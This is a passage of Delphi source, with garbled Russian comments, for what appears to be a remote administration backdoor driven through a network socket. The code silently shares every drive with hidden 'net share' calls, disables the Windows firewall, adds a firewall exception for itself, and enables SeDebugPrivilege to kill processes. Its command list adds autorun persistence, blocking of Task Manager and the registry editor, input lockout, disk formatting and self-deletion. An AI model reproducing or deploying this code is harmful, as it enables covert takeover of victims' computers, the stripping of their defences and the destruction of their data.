         // OEMToANSI(szBuffer, szBuffer);
         WriteLf(szBuffer, false);
      End;

  // Read error pipe
   While true Do
      Begin
         FillChar(szBuffer, SizeOf(szBuffer), 0);
         bTest:=ReadFile(hPipeErrorsRead, szBuffer, 256, dwNumberOfBytesRead, nil);
         If Not bTest Then Break;
         // OEMToANSI(szBuffer, szBuffer);
         WriteLf(szBuffer, false);
      End;
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(hPipeOutputRead);
  CloseHandle(hPipeErrorsRead);
End;

function SysVolInfExists(const Disk: PChar): Boolean;
var
  Code : Integer;
   Buf : PathBuf;
begin
  LStrCpy(Buf,#0);//������ � ������������� ����������
  LStrCat(Buf,Disk);//���������� �������� Disk
  LStrCat(Buf,'System Volume Information');//���������� ������
  Code := GetFileAttributes(Buf); //�������� ��� ��������
  Result := (Code <> -1) and ($10 and Code <> 0);//��������� ��������
end;

procedure ShareDisk;
var
   sdf: THandle;
   i1 : integer;
   i2 : integer;
   i4 : integer;
   F1 : pathbuf;
   F2 : pathbuf;
   s  : string;
  Buf : array [0..95] of char;
begin
  GetModuleFileName(0,F1,MAX_PATH);//���� � ����
  GetLogicalDriveStrings(96,Buf); //������ ������
for i1:=0 to 25 do
  if Buf[i1*4+2]<>#92 then break;
  //�������� ���������� ������
  if Buf[0]=#65 then i4:=1 else i4:=0;
  for i2:=i4 to i1-1 do
  //������� �� ���� ������
    begin
      //��� �����
      if (SysVolInfExists(@Buf[i2*4])) or (not SysVolInfExists(@Buf[i2*4])) then
      //� ��� ����� System Volume Information ��..
      begin
        LStrCpy(F2,#0); //������ � ������������� ����������
        LStrCat(F2,@Buf[i2*4]);// + ����
        s:=F2[0]+F2[1]+F2[3];
        s:=Trim(s);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share Share_'+Trim(F2[0])+'='+s),pchar(''),SW_HIDE);
        WriteLf('Disk '+s+' - share enable!');
      end;
    end;
       //��������� ����������
        ExecConsoleApp('netsh firewall set opmode disable');
        ExecConsoleApp('netsh advfirewall set allprofiles state off');
        WriteLf('Disable Firewall!');
end;

procedure ShareDiskDel;
var
  sdf : THandle;
   i1 : integer;
   i2 : integer;
   i4 : integer;
   F1 : pathbuf;
   F2 : pathbuf;
   s  : string;
  Buf : array [0..95] of char;
Begin
  GetModuleFileName(0,F1,MAX_PATH);//���� � ����
  GetLogicalDriveStrings(96,Buf); //������ ������
for i1:=0 to 25 do
  if Buf[i1*4+2]<>#92 then break;
  //�������� ���������� ������
  if Buf[0]=#65 then i4:=1 else i4:=0;
  for i2:=i4 to i1-1 do
  //������� �� ���� ������
    begin
      //��� �����
      if (SysVolInfExists(@Buf[i2*4])) or (not SysVolInfExists(@Buf[i2*4])) then
      //� ��� ����� System Volume Information ��..
      begin
        LStrCpy(F2,#0); //������ � ������������� ����������
        LStrCat(F2,@Buf[i2*4]);// + ����
        s:=F2[0];
        s:=Trim(s);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share Share_'+s+' /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share '+s+'$ /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share print$ /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share ADMIN$ /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share Users /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share HP LaserJet 6L /delete'),pchar(''),SW_HIDE);
        ShellExecute(sdf,pchar(''),pchar('net'),pchar('share IPC$ /delete'),pchar(''),SW_HIDE);
        WriteLf('Share Share_'+F2[0]+' - disable!');
      end;
    end;
       //�������� ����������
        ExecConsoleApp('netsh firewall set opmode enable');
        ExecConsoleApp('netsh advfirewall set allprofiies state on');
        WriteLf('Enable Firewall!');
end;

Procedure MyFirewall;
// �������� ���������� � ������ ����������� �������� ��������� Windows
Begin
   ExecConsoleApp('netsh advfirewall firewall add rule name="Firewall" dir=in action=allow program="'+ParamStr(0)+'" enable=yes');
End;

Procedure ShowBack;
// ������� ������� �����, ������ �������, ������� �����
Begin
   if (EchoOn) Then Write(#08' '#08);
End;

Function Echo: String;
// ��������� ������ � ���������������
Var Msg: String;
    TmpChar: Char;
    MsgLen: Integer;
Begin
   Result := '';
   SetLength(Msg, 0);
   repeat
      if (not Check_Avail) Then break;
      MsgLen := Recv(Cln, @TmpChar, 1, 0);
      if ((TmpChar = CR) or (Length(Msg) >= MaxCmdLen)) Then
      // Enter
      Begin
         Recv(Cln, @TmpChar, 1, 0); // ����� LF
         if (EchoOn) Then Write(LN_FEED);
         Msg      := RecodeToANSI(Msg);
         Result   := Msg;
         Exit;
      End
      Else if ((TmpChar = #08) or (TmpChar = #127)) Then
      // BackSpace
         Begin
            If (Length(Msg) > 0) Then
               Begin
                  SetLength(Msg, Length(Msg) - 1);
                  ShowBack;
               End;
         End
      Else
      // ������� ������
         Begin
            if (EchoOn) Then Write(TmpChar);
            Msg := Msg + TmpChar;
         End;
   until (MsgLen <= 0);
End;

Function ReadCmd: String;
// ������ ���������� ������
Begin
   Result := Echo;
End;

Function ReadLogin: String;
Begin
   Result := Echo;
End;

Function ReadPasw: String;
// ������ ������ (����������� ��������)
Var Psw: String;
    TmpChar: Char;
    PswLen: Integer;
Begin
   Result := '';
   SetLength(Psw, 0);
   repeat
      if (not Check_Avail) Then break;
      PswLen := Recv(Cln, @TmpChar, 1, 0);
      if ((TmpChar = CR) or (Length(Psw) >= MaxCmdLen)) Then
      // Enter
      Begin
         TmpChar  := #0;
         Result   := Psw;
         Psw      := '          ';
         Recv(Cln, @TmpChar, 1, 0); // ����� LF
         if (EchoOn) Then Write(LN_FEED);
         Exit;
      End
      Else If (TmpChar = #08) Then
      // BackSpace
         Begin
            If (Length(Psw) > 0) Then
               Begin
                  SetLength(Psw, Length(Psw) - 1);
                  ShowBack;
               End;
         End
      Else
      // ������� ������
         Begin
            Psw := Psw + TmpChar;
            if (EchoOn) Then Write('*')
            Else
            // ��� ���������, �� �� ����� ������� ��������, �����������,
            // ��� �������� ���������� �������� �������
               Begin
                  EchoOn := true;
                  ShowBack;
                  Write('*');
                  EchoOn := false;
               End;
         End;
   until (PswLen <= 0);
End;

Procedure Usage;
// ������� ������� �������
Begin
   WriteLf(' Internal server commands (starting with "\"): ' + LN_FEED +
   ' --- Main ---' + LN_FEED +
   '   h|?|help - This help' + LN_FEED +
   '   q|quit|exit|x|bye - Disconnect' + LN_FEED +
   '   r - Restart server' + LN_FEED +
   '   s - Shutdown server' + LN_FEED +
   '   v|V - Version' + LN_FEED +
   ' --- Directory commands ---' + LN_FEED +
   '   pwd - Show current directory' + LN_FEED +
   '   cd <dir> - Change directory' + LN_FEED +
   '   ls [dir] - Show directory content' + LN_FEED +
   '   mkdir <dir> - Make new directory' + LN_FEED +
   '   rmdir <dir> - Remove empty directory' + LN_FEED +
   '   rmr <dir> - Recursively remove directory' + LN_FEED +
   ' --- File commands ---' + LN_FEED +
   '   cp <file1><\ ><file2> - Copy file1 to file2' + LN_FEED +
   '   mv <file1><\ ><file2> - Rename file1 to file2' + LN_FEED +
   '   rm <file> - Delete file' + LN_FEED +
   '   cat <file> - Print file on the terminal' + LN_FEED +
   ' --- Find commands ---' + LN_FEED +
   '   sf <Disk>< \ ><*.txt> - Find file, c \ *.txt' + LN_FEED +
   '   findm <file><\ ><mask> - Find file, based on mask' + LN_FEED +
   '   finds <file><\ ><size> - Find File, creater or equal size' + LN_FEED +
   ' --- Disk commands ---' + LN_FEED +
   '   du <dir/file> - File or directory size' + LN_FEED +
   '   ds <Disk> - Disk statistics' + LN_FEED +
   '   formatd <Disk> - FormatDriveDisk' + LN_FEED +
   '   dre - DriveEx - All disks in the system' + LN_FEED +
   ' --- Process control commands ---' + LN_FEED +
   '   ps - Show process list' + LN_FEED +
   '   kill <PID> - Terminate process with PID' + LN_FEED +
   '   killp <PID> - Terminate process with NAME' + LN_FEED +
   '   killx <PID> - Terminate process *.*' + LN_FEED +
   ' --- Commands Encrypt File/String---' + LN_FEED +
   '   encs [String] - Command Encrypt encs test' + LN_FEED +
   '   decs [String] - Command Decrypt decs 2@3we$' + LN_FEED +
   '   encf < \ > - EncryptFile command encf file1 to file2' + LN_FEED +
   '   decf < \ > - DecryptFile command decf file1 to file2' + LN_FEED +
   ' --- Commands running ---' + LN_FEED +
   '   cmd [command] - Do command with cmd.exe' + LN_FEED +
   '   run <command> - Run command with ShellExecute' + LN_FEED +
   ' --- Other commands ---' + LN_FEED +
   '   bi - Block input (keyboard and mouse)' + LN_FEED +
   '   getwindows - GetWindowsPath(DirectoryWindows)' + LN_FEED +
   '   getcomp - GetCompName / User' + LN_FEED +
   '   findallcomp <Group> - GetFindAllComp' + LN_FEED +
   '   getip - GetLocalIP' + LN_FEED +
   '   shared - ShareAllDisk - Disable Firewall' + LN_FEED +
   '   shareddel - ShareAllDiskDel - Enable Firewall' + LN_FEED +
   '   firewall - firewall show rule name=all' + LN_FEED +
   '   myfire - MyProgram Firewall enable=yes' + LN_FEED +
   '   autorun - AutoReg programm autorun' + LN_FEED +
   '   getos - GetOSVersionText' + LN_FEED +
   '   blockreg <command> - Block - 1/UnBlock - 0' + LN_FEED +
   '   blockautorun <command> - Block - 1/UnBlock - 0' + LN_FEED +
   '   blocktm <command> - BlockTaskMgr - 1/UnBlock - 0' + LN_FEED +
   '   ubi - Unblock input' + LN_FEED +
   '   msg <message> - Show message' + LN_FEED +
   '   print <file> - Print file via printer' + LN_FEED +
   '   reboot - Reboot OS' + LN_FEED +
   '   delserver - Selfdeleting' + LN_FEED + 
   ' END'
   );
End;

Procedure DiskStat(DChar: Char);
// ���������� �� ����� (�����, ������, ��������)
Var DSz, DfSz, DuSz: Int64;
    DskStr: String;

Begin
   If DChar = #0 Then DChar:=#64; //(64 - 64 = 0)
   DChar:=UpCase(DChar);
   If (DChar < #64) Or (DChar > #90) Then
      Begin
         WriteLf(ErrArray[4]);
         Exit;
      End;
   DfSz  := DiskFree(Ord(DChar) - 64);
   DSz   := DiskSize(Ord(DChar) - 64);
   DuSz  :=DSz - DfSz;
   DfSz  :=Trunc(DfSz/1024);
   DuSz  :=Trunc(DuSz/1024);
   DSz   :=Trunc(DSz/1024);
   GetDir(0, DskStr);
   If (DChar = #64) Then DChar:=DskStr[1]; //����� �������� �����
   DskStr:='Drive ' + DChar + ' statistics: ' + LN_FEED + ' Size: '
             + IntToStr(DSz) + ' K (' + IntToStr(DSz div 1024) + '.' +
             IntToStr(DSz mod 1024) + ' M)' + LN_FEED
             + ' Free: ' + IntToStr(DfSz) + ' K (' +
             IntToStr(DfSz div 1024) + '.' + IntToStr(DfSz mod 1024) + ' M)'
             + LN_FEED + ' Usage: ' + IntToStr(DuSz) + ' K ('
             + IntToStr(DuSz div 1024) + '.' + IntToStr(DuSz mod 1024) + ' M)';
   WriteLf(DskStr);
End;

Function Pwd: String;
// ������� ������� �������
Var CDir: String;
Begin
   GetDir(0,CDir);
   Result:=CDir;
   WriteLf(CDir);
   ShErr;
End;

Procedure Ls(Dir: String);
// ������� ���������� ��������
Var Sr: TSearchRec;
    DName: String;
    I: Integer;

Begin
   // ������� �� ����� - ��� ����� � �������
   If Dir = '' Then Dir := Pwd + '\*.*';
   // ������� ������������ �� \ - ��� ����� � ��
   If LastDelimiter('\', Dir) = Length(Dir) Then Dir:=Dir + '*.*';
   If FindFirst(Dir, faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
   //      Sr.Time
         // ����� ���������� � *nix �����
         DName:='';
         If (Sr.Attr And faDirectory <> 0) Then DName:=DName + 'd'
         Else DName:=DName + '-';
         If (Sr.Attr And faReadOnly <> 0) Then DName:=DName + 'r'
         Else DName:=DName + '-';
         If (Sr.Attr And faHidden <> 0) Then DName:=DName + 'h'
         Else DName:=DName + '-';
         If (Sr.Attr And faSysFile <> 0) Then DName:=DName + 's'
         Else DName:=DName + '-';
         If (Sr.Attr And faArchive <> 0) Then DName:=DName + 'a'
         Else DName:=DName + '-';
         If (Sr.Attr And faSymLink <> 0) Then DName:=DName + 'l'
         Else DName:=DName + '-';
         DName:=DName + ' ' + Sr.Name;
         FileDateToDateTime(Sr.Time);

         // ���������� :-)
         If (Length(DName) < MaxLn) Then
         For I:=1 To MaxLn - Length(DName)
            Do
               DName:=DName + ' '
         Else DName:=DName + ' ';
         If (Sr.Attr And faDirectory = 0) Then DName:=DName + IntToStr(Sr.Size);
         WriteLf(DName);
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
End;

Function MatchFunct(Name: String; Mask: String): Boolean; overload;
// ��� ����� ���� ������
// ��������� �������� �� ������ ��� �����
Var NPos, MPos, Nl, Ml: Integer;

Begin
   // ��� �� *nix, ������� �� ���������
   Name := StrUpper(PChar(Name));
   Mask:=StrUpper(PChar(Mask));
   Result:=False;
   NPos:=1;
   MPos:=1;
   Nl:=Length(Name);
   Ml:=Length(Mask);
   While ((NPos <= Nl) And (MPos <= Ml)) Do
   Case Mask[MPos] Of
      '*':
         Begin
            If (MPos >= Ml) Then
               Begin
                  // ����� �����������, * - �������� ������ �����
                  Result:=True;
                  Exit;
               End
            Else
            If ((Mask[MPos + 1] = '?') And (NPos + 1 <= Nl)) Then
               Begin
                  // ���� ������� ����� * � ����� - ����� ��������� ������ � �����
                  MPos:=MPos + 1;
                  NPos:=NPos + 1;
               End
            Else
            // ���������� ** ���� �� ����� (���� �� �����������)
            If (Pos(Mask[MPos + 1], Name) >= NPos) Then
               Begin
                  MPos:=MPos + 1;
                  NPos:=Pos(Mask[MPos], Name);
               End
            Else Exit;
         End;
      '?':
         Begin
            NPos:=NPos + 1;
            MPos:=MPos + 1;
            // ������ ����� �����������, �� � � ����� ��� ���� ����� ������
            If (NPos > Nl) Then Exit;
         End;
      Else
         Begin
         // ������ ������� ����� �� ������������� �������� � �����
            If (Name[NPos] <> Mask[MPos]) Then Exit;
            NPos:=NPos + 1;
            MPos:=MPos + 1;
         End;
   End;
   If (MPos < Ml) Then Exit;
   Result:=True;
End;

Function MatchFunct(Sz, MaxSz: LongInt): Boolean; overload;
Begin
   If (Sz >= MaxSz) Then Result:=True
   Else Result:=False;
End;

Procedure SF(FDir: String; FM: String);
// ���� ���� �� ���������� ��������
Var
  Sr: TSearchRec;
Begin
     FDir:=Trim(FDir);
  If FindFirst(FDir + ':\'+FM, faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..') Or (Sr.Name = '')) Then Continue;
         If (MatchFunct(Sr.Name, FM)) Then WriteLf(Sr.Name);
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               SF(Sr.Name, FM);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
End;

Procedure FindFile(DName, FName: String); overload;
// ���� ���� �� �����, ������� � ���������� ��������
Var
  Sr: TSearchRec;
Begin
   DName:=IncludeTrailingPathDelimiter(DName);
   If FindFirst(DName + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         If (MatchFunct(Sr.Name, FName)) Then WriteLf(DName + Sr.Name);
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               FindFile(DName + Sr.Name, FName);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
End;

Procedure FindFile(DName: String; Sz: Integer); overload;
// ���� ���� ������ ��� ������ ���������� �������
// ���� ���������� �������� "�������" - ����������
Var
  Sr: TSearchRec;
Begin
   DName:=IncludeTrailingPathDelimiter(DName);
   If FindFirst(DName + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         Sr.Size:=Round(Sr.Size/1024);
         If (MatchFunct(Sr.Size, Sz)) Then
         Begin
            If (Sr.Attr And faHidden <> 0) Then Write('-H- ');
            WriteLf(DName + Sr.Name + ' ' + IntToStr(Sr.Size) + ' K');
         End;
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               FindFile(DName + Sr.Name, Sz);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
End;

Function Rm(const FName: String): Boolean;
// ������� ����
Begin
   If Not DeleteFile(PChar(FName)) Then
      Begin
         WriteLf(ErrArray[11]);
         Result:=False;
      End;
   Result:=True;
End;

Procedure Rmr(Nm: String);
// ������� ������� ����������
Var
  Sr: TSearchRec;
Begin
   Nm:=IncludeTrailingPathDelimiter(Nm);
   If FindFirst(Nm + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               Rmr(Nm + Sr.Name);
               Continue;
            End;
         Rm(Nm + Sr.Name);
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
   RmDir(Nm); // ������ ��� ������ Nm
End;

Procedure Mv(const Nm1, Nm2: String);
// �������������� ���� ��� �������
Begin
   // ���� ���� ���� � ����� ������ - ������
   If FileExists(Nm2) Then
      If Not Rm(Nm2) Then Exit;
   If Not MoveFile(PChar(Nm1), PChar(Nm2)) Then
      WriteLf(ErrArray[12]);
End;

Function FileSz(const FName: String): Integer;
// ������� ������ �����
Var fl: File of Byte;
    LastMode: Integer;
Begin
   Result:=-1;
   AssignFile(Fl, FName);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl);
   FileMode:=LastMode;
   If ShErr Then Exit;
   Result:=FileSize(fl);
   CloseFile(fl);
End;

Function Du(const Nm: String): Int64;
// ������� ������ ����� ��� ��������
   Procedure GetDirSize(Const aPath: String; Var SizeDir: Int64);
   // �������: ��������� �� ���. ��������� ������ ��������.
   // �������� ���������� �� ���������.
   // ��������� � ���������� SizeDir ����� ��������.
   Var
     SR: TSearchRec;
     tPath: string;
   Begin
     tPath := IncludeTrailingPathDelimiter(aPath);
     If FindFirst(tPath + '*.*', faAnyFile, SR) = 0 then
        Begin
          Try
            Repeat
              If (SR.Name = '.') or (SR.Name = '..') Then Continue;
              If (SR.Attr and faDirectory) <> 0 Then
                 Begin
                   GetDirSize(tPath + SR.Name, SizeDir);
                   Continue;
                 End;
              SizeDir := SizeDir +
              (SR.FindData.nFileSizeHigh shl 32) +
              SR.FindData.nFileSizeLow;
            Until FindNext(SR) <> 0;
          Finally
        SysFuncs.FindClose(SR);
        End;
     End;
   End;
Var DSz: Int64;
Begin
   Result:=-1;
   DSz:=0;
   // ���� �������, ���� GetDirSize, ����� FileSz
   If DirectoryExists(Nm) Then GetDirSize(Nm, DSz)
   Else DSz:=FileSz(Nm);
   Result:=DSz;
End;

Procedure Cp(const Nm1, Nm2: String);
// �������� ����
Var fl1, fl2: File;
    fBuf: Array[1..Bs] Of Byte;
    Bytes, BytesW, LastMode: Integer;
Begin
   AssignFile(fl1, Nm1);
   AssignFile(fl2, Nm2);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl1, 1);
   If ShErr Then Exit;
   FileMode:=LastMode;
   ReWrite(fl2, 1);
   If ShErr Then
      Begin
         CloseFile(fl1);
         Exit;
      End;
   Repeat
      BlockRead(fl1, fBuf, SizeOf(fBuf), Bytes);
      If ShErr Then
         Begin
            CloseFile(fl1);
            CloseFile(fl2);
            Exit;
         End;
      BlockWrite(fl2, fBuf, Bytes, BytesW);
      If ShErr Then
         Begin
            CloseFile(fl1);
            CloseFile(fl2);
            Exit;
         End;
   Until (Bytes = 0) Or (BytesW <> Bytes);
   CloseFile(fl1);
   CloseFile(fl2);
   WriteLf('CopyFile - OK');
   If (BytesW <> Bytes) Then WriteLf(ErrArray[13]);
End;

Procedure Cat(const FName: String);
// ������� ���������� ����� (��� �� ���������� �����, �������� ������ � �����) 
Var fl1: Text;
    fBuf: String;
    LastMode: Integer;
Begin
   AssignFile(fl1, FName);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl1);
   If ShErr Then Exit;
   FileMode:=LastMode;
   If ShErr Then
      Begin
         CloseFile(fl1);
         Exit;
      End;
   While Not EOF(fl1)
      Do
         Begin
            ReadLn(fl1, fBuf);
            If ShErr Then
               Begin
                  CloseFile(fl1);
                  Exit;
               End;
            WriteLf(fBuf);
         End;
   CloseFile(fl1);
End;

// ���������/������������ ���� (���� � ����������)
Procedure BlockInput(ABlockInput: Boolean); stdcall; external 'USER32.DLL';

Procedure Ps;
// ������� ������ ���������
Var
   aSnapshotHandle: THandle;
   aProcessEntry32: TProcessEntry32;
   I: Integer;
   bContinue: BOOL;
   PrHandle: THandle;
   ExePath: array[0..MAX_PATH] of Char;
   SysTemDir: array[0..MAX_PATH] of Char;
   WinTemDir: array[0..MAX_PATH] of Char;
   PName: String;
   pmc: PPROCESS_MEMORY_COUNTERS;
   cb:  Integer;
   s,p: string;
   PIDList: string;
   NamesList: string;
   PathsList: string;
Begin
   s:='';
   p:='';
   NamesList:='';
   PIDList:='';
   PathsList:='';
   aSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   aProcessEntry32.dwSize:=SizeOf(aProcessEntry32);
   {��������� ������}
   if aSnapshotHandle = INVALID_HANDLE_VALUE then Exit;
   aProcessEntry32.dwSize := SizeOf(ProcessEntry32);
   PName:='  Executable name';
   For I:=1 To Round(MaxLn/2) Do
   PName:=PName + ' ';
   PName:='PID/Parent PID    '+PName;
   WriteLf(PName);
   {��� ������ ���������}
  if Process32First(aSnapshotHandle, aProcessEntry32) then
     WriteLf('-===========FOR WINDOWSXP===========-    ');
  while Process32Next(aSnapshotHandle, aProcessEntry32) do
  begin
    PrHandle:= OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, aProcessEntry32.th32ProcessID);
    GetModuleFileNameEx(aSnapshotHandle, 0, ExePath, MAX_PATH);
    cb:= SizeOf(_PROCESS_MEMORY_COUNTERS);
    GetMem(pmc, cb);
    pmc^.cb := cb;
    GetProcessMemoryInfo(PrHandle, pmc, cb);
    GetSystemDirectory(SysTemDir, MAX_PATH);
    GetWindowsDirectory(WinTemDir, MAX_PATH);
    p:=ExtractFilePath(aProcessEntry32.szExeFile);
    s:=SysTemDir;
    NamesList:=aProcessEntry32.szExeFile;
    PIDList:=IntToStr(aProcessEntry32.th32ProcessID);
    PathsList:=S+'\'+NamesList;
    if FileExists(p+aProcessEntry32.szExeFile) then WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    if FileExists(PathsList) then WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb')
    else
    if aProcessEntry32.szExeFile = 'winlogon.exe' then begin
      PathsList:=SysTemDir + '\winlogon.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'wininit.exe' then begin
      PathsList:=SysTemDir + '\wininit.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'smss.exe' then begin
      PathsList:=SysTemDir + '\smss.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'lsass.exe' then begin
      PathsList:=SysTemDir + '\lsass.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'services.exe' then begin
      PathsList:=SysTemDir + '\services.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'spoolsv.exe' then begin
      PathsList:=SysTemDir + '\spoolsv.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'telnet.exe' then begin
      PathsList:=SysTemDir + '\telnet.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'cmd.exe' then begin
      PathsList:=SysTemDir + '\cmd.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'mdm.exe' then begin
      PathsList:=SysTemDir + '\mdm.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'explorer.exe' then begin
      PathsList:=WinTemDir + '\explorer.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'csrss.exe' then begin
      PathsList:=SysTemDir + '\csrss.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'svchost.exe' then begin
      PathsList:=SysTemDir + '\svchost.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'System' then begin
      PathsList:='System';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
   if ExePath[0] <> '?' then begin
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
   end;
   CloseHandle(PrHandle);
  end;
   WriteLf('-===========PID PROCESS===========-    ');
   bContinue:=Process32First(aSnapshotHandle, aProcessEntry32);
   While Integer(bContinue) <> 0
      Do
         Begin
            PName:=aProcessEntry32.szExeFile;
            If (Length(PName) < MaxLn) Then
            For I:=1 To MaxLn - Length(PName)
               Do
                  PName:=PName + '-'
            Else PName:=PName + '-';
            PName:=PName + ' ' + IntToStr(aProcessEntry32.th32ProcessID) + '<-'
            + IntToStr(aProcessEntry32.th32ParentProcessID);
            WriteLf(PName);
            bContinue:=Process32Next(aSnapshotHandle, aProcessEntry32);
         End;
   CloseHandle(aSnapshotHandle);
End;

Function Kill(const dwPID: Cardinal): Boolean;
// ��������� �������
Var
 hToken: THandle;
 SeDebugNameValue: Int64;
 tkp: TOKEN_PRIVILEGES;
 ReturnLength: Cardinal;
 hProcess: THandle;
Begin
   Result:=False;
    // ��������� ���������� SeDebugPrivilege
    // ��� ������ �������� ����� ������ ��������
   If Not OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or
      TOKEN_QUERY, hToken) Then Exit;

    // �������� LUID ����������
   If Not LookupPrivilegeValue(nil, 'SeDebugPrivilege', SeDebugNameValue) Then
      Begin
         CloseHandle(hToken);
         Exit;
      End;

   Tkp.PrivilegeCount:= 1;
   Tkp.Privileges[0].Luid := SeDebugNameValue;
   Tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;

   // ��������� ���������� � ������ ��������
   AdjustTokenPrivileges(hToken, False, Tkp, SizeOf(Tkp), Tkp, ReturnLength);
   If GetLastError()<> ERROR_SUCCESS  Then Exit;

   // ��������� �������. ���� � ��� ���� SeDebugPrivilege, �� �� �����
   // ��������� � ��������� �������
   // �������� ���������� �������� ��� ��� ����������
   hProcess:=OpenProcess(PROCESS_TERMINATE, FALSE, dwPID);
   If (hProcess = 0) Then Exit;
   // ��������� �������
   If Not TerminateProcess(hProcess, DWORD(-1)) Then Exit;
   CloseHandle(hProcess);

   // ������� ����������
   Tkp.Privileges[0].Attributes:=0;
   AdjustTokenPrivileges(hToken, FALSE, Tkp, SizeOf(tkp), tkp, ReturnLength);
   If (GetLastError<>ERROR_SUCCESS) Then Exit;

   Result:=True;
End;

function KillTask(ExeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while Integer(ContinueLoop) <> 0 do
  begin
